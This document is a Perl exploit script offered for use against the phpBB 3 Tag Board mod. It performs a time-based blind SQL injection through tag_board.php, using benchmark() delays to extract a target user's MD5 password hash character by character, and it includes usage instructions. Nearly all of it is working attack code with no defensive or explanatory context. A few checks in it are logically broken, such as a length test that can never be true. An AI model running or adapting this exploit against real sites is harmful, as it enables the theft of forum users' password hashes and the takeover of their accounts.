#!/usr/bin/perl 
# ---------------------------------------------------------------
# phpBB 3 (Mod Tag Board <= 4) Remote Blind SQL Injection Exploit  
# by athos - staker[at]hotmail[dot]it
# http://bx67212.netsons.org/forum/viewforum.php?f=3
# ---------------------------------------------------------------
# Note: Works regardless PHP.ini settings!
# Thanks meh also know as cHoBi
# ---------------------------------------------------------------

use strict;
use LWP::UserAgent;

my ($hash,$time1,$time2);

my @chars = (48..57, 97..102); 
my $http  = new LWP::UserAgent;

my $host  = shift;
my $table = shift;
my $myid  = shift or &usage;


sub injection
{
    my ($sub,$char) = @_;
    
    return "/tag_board.php?mode=controlpanel&action=delete&id=".
           "1+and+(select+if((ascii(substring(user_password,${sub},1)".
           ")=${char}),benchmark(230000000,char(0)),0)+from+${table}_us".
           "ers+where+user_id=${myid})--";
}


sub usage
{
    print STDOUT "Usage: perl $0 [host] [table_prefix] [user_id]\n";
    print STDOUT "Howto: perl $0 http://localhost/phpBB phpbb 2\n";
    print STDOUT "by athos - staker[at]hotmail[dot]it\n";
    exit;
}


syswrite(STDOUT,'Hash MD5: ');

for my $i(1..33)
{
    for my $j(0..16)
    {
        $time1 = time();

        $http->get($host.injection($i,$chars[$j]));
        
        $time2 = time();

        if($time2 - $time1 > 6)
        {
            syswrite(STDOUT,chr($chars[$j]));
            $hash .= chr($chars[$j]); 
            last;
        }
        
        if($i == 1 && length $hash < 0)
        {
            syswrite(STDOUT,"Exploit Failed!\n");
            exit;
        } 
    }
}
